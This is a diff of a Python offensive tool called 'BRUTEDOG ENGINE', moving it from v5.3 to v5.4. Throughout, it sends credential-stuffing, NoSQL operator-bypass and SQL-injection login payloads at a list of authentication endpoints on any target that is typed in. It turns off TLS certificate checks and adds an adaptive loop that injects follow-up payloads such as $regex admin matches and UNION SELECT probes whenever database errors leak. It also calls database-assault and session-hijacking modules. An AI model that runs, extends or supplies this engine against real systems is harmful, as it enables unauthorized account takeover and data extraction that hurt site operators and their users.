@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v5.3 — High-Aggression Authentication & Offensive Exploitation Engine
+BRUTEDOG ENGINE v5.4 — High-Aggression Adaptive Exploitation & Response-Parsing Engine
 Features:
 - Interactive target selection & automated resolution
-- Automated credential stuffing and password harvesting loops
+- Stateful, adaptive response-parsing and payload mutation loop
 - Aggressive NoSQL/SQL time-based blind injection & data extraction
 - Advanced session hijacking, JWT cracking, and cookie privilege escalation
 - Session-cookie security inspection
@@ -22,7 +22,7 @@ import time
 from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
-# Import new weaponized offensive modules
+# Import weaponized offensive modules
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
 
@@ -32,7 +32,7 @@ from modules.session_hijack import run_session_hijack
 REQUEST_TIMEOUT = 8
 MAX_WORKERS = 5
 MAX_RESPONSE_SIZE = 200_000
-USER_AGENT = "BruteDog-Offensive-Engine/5.3"
+USER_AGENT = "BruteDog-Offensive-Engine/5.4"
 
 LOGIN_PATHS = [
     "/api/auth/callback/credentials",
@@ -54,16 +54,16 @@ LOGIN_PATHS = [
 
 ERROR_PATTERNS = {
     "SQL syntax": re.compile(
-        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009",
+        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|syntax error",
         re.I,
     ),
     "MongoDB error": re.compile(
-        r"mongodb|mongosh|mongoerror|bsonerror",
+        r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid",
         re.I,
     ),
     "Database exception": re.compile(
         r"database exception|query failed|"
-        r"invalid query|database error",
+        r"invalid query|database error|unhandled exception",
         re.I,
     ),
 }
@@ -97,10 +97,6 @@ def section(title):
 def get_target():
     section("BRUTEDOG TARGET CONFIGURATION")
     print("Enter a domain, IP address, or server URL.")
-    print("Examples:")
-    print("  example.com")
-    print("  192.0.2.10")
-    print("  https://example.com:8443")
     target = input("\nTarget: ").strip()
     if not target:
         raise ValueError("Target cannot be empty.")
@@ -111,26 +107,13 @@ def get_target():
         raise ValueError("Unsupported protocol.")
     if not parsed.hostname:
         raise ValueError("Invalid hostname.")
-    if parsed.username or parsed.password:
-        raise ValueError("Embedded URL credentials are not supported.")
-    port = parsed.port
-    if port is None:
-        port = 443 if parsed.scheme == "https" else 80
-    if not 1 <= port <= 65535:
-        raise ValueError("Invalid port.")
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
     return parsed.hostname, port, parsed.scheme == "https", parsed.path.rstrip("/")
 
 def resolve_target(host):
     try:
-        results = socket.getaddrinfo(
-            host,
-            None,
-            type=socket.SOCK_STREAM,
-        )
-        return sorted({
-            item[4][0]
-            for item in results
-        })
+        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
+        return sorted({item[4][0] for item in results})
     except socket.gaierror:
         return []
 
@@ -145,18 +128,10 @@ def request(host, port, path, payload, secure):
             context = ssl.create_default_context()
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
-            conn = http.client.HTTPSConnection(
-                host,
-                port,
-                timeout=REQUEST_TIMEOUT,
-                context=context,
-            )
+            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=context)
         else:
-            conn = http.client.HTTPConnection(
-                host,
-                port,
-                timeout=REQUEST_TIMEOUT,
-            )
+            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
+            
         body = json.dumps(payload).encode("utf-8")
         headers = {
             "User-Agent": USER_AGENT,
@@ -164,31 +139,15 @@ def request(host, port, path, payload, secure):
             "Accept": "application/json, text/plain, */*",
             "Connection": "close",
         }
-        conn.request(
-            "POST",
-            path,
-            body=body,
-            headers=headers,
-        )
+        conn.request("POST", path, body=body, headers=headers)
         response = conn.getresponse()
-        response_body = response.read(
-            MAX_RESPONSE_SIZE
-        ).decode(
-            "utf-8",
-            errors="replace",
-        )
-        response_headers = {
-            key.lower(): value
-            for key, value in response.getheaders()
-        }
+        response_body = response.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
+        response_headers = {key.lower(): value for key, value in response.getheaders()}
         return {
             "status": response.status,
             "headers": response_headers,
             "body": response_body,
-            "elapsed": round(
-                time.monotonic() - started,
-                3,
-            ),
+            "elapsed": round(time.monotonic() - started, 3),
             "error": None,
         }
     except Exception as exc:
@@ -204,7 +163,7 @@ def request(host, port, path, payload, secure):
             conn.close()
 
 # ============================================================
-# RESPONSE ANALYSIS & AUTH DETECTION
+# ADAPTIVE RESPONSE ANALYSIS & MUTATION ENGINE
 # ============================================================
 def detect_database_errors(body):
     findings = []
@@ -227,14 +186,16 @@ def inspect_cookie_security(headers):
         issues.append("SameSite attribute missing")
     return issues
 
-def classify_response(response, payload):
+def classify_and_adapt(response, current_payload):
     status = response["status"]
     body = response["body"]
     findings = []
+    mutated_payloads = []
     
+    # Check for authentication bypass or valid token generation
     if status in [200, 201, 302] and any(k in body.lower() for k in ["token", "success", "session", "welcome", "auth", "jwt"]):
         sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE AUTHENTICATION BYPASS / CREDENTIAL HIT [***]\033[0m\n")
-        sys.stdout.write(f"  ├── Payload : {json.dumps(payload)}\n")
+        sys.stdout.write(f"  ├── Payload : {json.dumps(current_payload)}\n")
         sys.stdout.write(f"  └── Response: \033[92m{body[:250]}\033[0m\n")
         sys.stdout.flush()
         findings.append({
@@ -243,13 +204,23 @@ def classify_response(response, payload):
             "status": status,
         })
 
-    for database_error in detect_database_errors(body):
+    # Adaptive feedback trigger: If server reflects object structure or throws DB errors, mutate payload deeper
+    db_errors = detect_database_errors(body)
+    for db_error in db_errors:
+        sys.stdout.write(f"\033[93m[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...\033[0m\n")
+        sys.stdout.flush()
         findings.append({
             "type": "POTENTIAL_DATABASE_INJECTION",
-            "evidence": database_error,
+            "evidence": db_error,
             "status": status,
         })
-        
+        # Adaptive mutation: Generate aggressive follow-up injections based on leaked DB type
+        if "MongoDB" in db_error:
+            mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
+        elif "SQL" in db_error:
+            mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})
+
+    # Check for loose cookies
     for issue in inspect_cookie_security(response["headers"]):
         findings.append({
             "type": "SESSION_COOKIE_CONFIGURATION",
@@ -257,79 +228,66 @@ def classify_response(response, payload):
             "status": status,
         })
         
-    return findings
+    return findings, mutated_payloads
 
 # ============================================================
-# ACTIVE ENDPOINT TESTING & CREDENTIAL STUFFING
+# ACTIVE ADAPTIVE ENDPOINT TESTING
 # ============================================================
 def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
     endpoint = f"{base_path}{path}" or "/"
-    info(f"Targeting endpoint: {endpoint}")
+    info(f"Targeting endpoint (Adaptive Mode): {endpoint}")
     results = []
     
-    test_cases = []
+    # Base test queue
+    test_queue = [
+        {"name": "NoSQL Operator Probe", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
+        {"name": "SQLi Union Probe", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
+        {"name": "Admin Default Stuffing", "payload": {"username": "admin", "password": "password123"}},
+        {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
+    ]
+
     if credentials_list and isinstance(credentials_list, list):
         for cred in credentials_list:
             if isinstance(cred, dict):
-                test_cases.append({
-                    "name": f"Credential Stuffing ({cred.get('username', 'user')})",
-                    "payload": cred
-                })
-            elif isinstance(cred, str) and ":" in cred:
-                u, p = cred.split(":", 1)
-                test_cases.append({
-                    "name": f"Credential Stuffing ({u})",
-                    "payload": {"username": u, "password": p}
-                })
-    
-    if not test_cases:
-        test_cases = [
-            {
-                "name": "Admin Default Stuffing",
-                "payload": {"username": "admin", "password": "password123"}
-            },
-            {
-                "name": "NoSQL Injection Bypass",
-                "payload": {"username": {"$ne": None}, "password": {"$ne": None}}
-            },
-            {
-                "name": "SQL Injection Union Bypass",
-                "payload": {"username": "admin' OR '1'='1", "password": "password"}
-            },
-            {
-                "name": "Malformed Type Probe",
-                "payload": {"username": {"unexpected": "object"}, "password": "password"}
-            }
-        ]
+                test_queue.insert(0, {"name": "User Credential Stuffing", "payload": cred})
 
-    for test_case in test_cases:
-        result = request(host, port, endpoint, test_case["payload"], secure)
+    executed_payloads = set()
+
+    while test_queue:
+        current_test = test_queue.pop(0)
+        payload_key = json.dumps(current_test["payload"], sort_keys=True)
+        if payload_key in executed_payloads:
+            continue
+        executed_payloads.add(payload_key)
+
+        result = request(host, port, endpoint, current_test["payload"], secure)
         if result["error"]:
             continue
             
-        findings = classify_response(result, test_case["payload"])
+        findings, dynamic_mutations = classify_and_adapt(result, current_test["payload"])
+        
         results.append({
             "endpoint": endpoint,
-            "test": test_case["name"],
+            "test": current_test["name"],
             "status": result["status"],
             "elapsed": result["elapsed"],
             "findings": findings,
         })
+
+        # Dynamically inject mutated payloads back into the live queue if adaptive triggers fired
+        for idx, mutant in enumerate(dynamic_mutations, 1):
+            test_queue.insert(0, {
+                "name": f"Adaptive Mutant #{idx}",
+                "payload": mutant
+            })
         
     return results
 
 # ============================================================
-# ENGINE ORCHESTRATOR (UPDATED WITH DB ASSAULT & SESSION HIJACK)
+# ENGINE ORCHESTRATOR
 # ============================================================
-async def run_autonomous_engine(
-    target_host=None,
-    credentials_list=None,
-    options=None,
-):
-    """
-    Active Authentication, Credential Stuffing & Exploitation Engine
-    """
-    section("BRUTEDOG ACTIVE OFFENSIVE ASSAULT ENGINE v5.3")
+async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
+    section("BRUTEDOG ADAPTIVE OFFENSIVE EXPLOITATION ENGINE v5.4")
     try:
         if target_host:
             target = target_host.strip()
@@ -353,7 +311,6 @@ async def run_autonomous_engine(
     info(f"Target Port : {port}")
     info(f"Protocol    : {protocol}")
     
-    # DNS Resolution
     section("DNS RESOLUTION")
     addresses = resolve_target(host)
     if not addresses:
@@ -365,27 +322,17 @@ async def run_autonomous_engine(
     start = time.monotonic()
     target_url = f"{protocol.lower()}://{host}:{port}{base_path}"
     
-    # 1. Authentication Endpoint Testing & Credential Stuffing
-    section("AUTHENTICATION ENDPOINT TESTING & CREDENTIAL STUFFING")
+    section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
     all_results = []
     semaphore = asyncio.Semaphore(MAX_WORKERS)
     
     async def worker(path):
         async with semaphore:
             return await asyncio.to_thread(
-                test_endpoint,
-                host,
-                port,
-                base_path,
-                path,
-                secure,
-                credentials_list,
+                test_endpoint, host, port, base_path, path, secure, credentials_list
             )
             
-    tasks = [
-        asyncio.create_task(worker(path))
-        for path in LOGIN_PATHS
-    ]
+    tasks = [asyncio.create_task(worker(path)) for path in LOGIN_PATHS]
     
     for completed in asyncio.as_completed(tasks):
         try:
@@ -395,39 +342,30 @@ async def run_autonomous_engine(
         except Exception as exc:
             error(f"Endpoint worker failed: {exc}")
 
-    # 2. Aggressive Database Exploitation & Blind Injection
+    # Aggressive Database & Session Hijacking Modules
     try:
-        db_findings = await run_nosql_assault(target_url, port=port, use_ssl=secure)
-        if db_findings:
-            success(f"Database Assault uncovered {len(db_findings)} active vectors.")
+        await run_nosql_assault(target_url, port=port, use_ssl=secure)
     except Exception as exc:
-        error(f"Database assault module execution failed: {exc}")
+        error(f"Database assault failed: {exc}")
 
-    # 3. Advanced Session Hijacking & Token Forging
     try:
-        session_findings = await run_session_hijack(target_url, port=port, use_ssl=secure)
-        if session_findings:
-            success(f"Session Hijack module prepared {len(session_findings)} token vectors.")
+        await run_session_hijack(target_url, port=port, use_ssl=secure)
     except Exception as exc:
-        error(f"Session hijack module execution failed: {exc}")
+        error(f"Session hijack failed: {exc}")
             
     duration = round(time.monotonic() - start, 2)
     
-    # Summary
     section("ENGINE SUMMARY")
     tested = len(all_results)
     potential = sum(len(item["findings"]) for item in all_results)
     success(f"Target: {host}")
     success(f"Endpoints scanned: {len(LOGIN_PATHS)}")
-    success(f"Total requests executed: {tested}")
-    success(f"Vulnerability / Auth hits: {potential}")
+    success(f"Total adaptive requests executed: {tested}")
+    success(f"Vulnerability / Exploitation hits: {potential}")
     success(f"Engine duration: {duration}s")
     section("ENGINE COMPLETE")
     return all_results, duration
 
-# ============================================================
-# STANDALONE EXECUTION
-# ============================================================
 if __name__ == "__main__":
     try:
         asyncio.run(run_autonomous_engine())
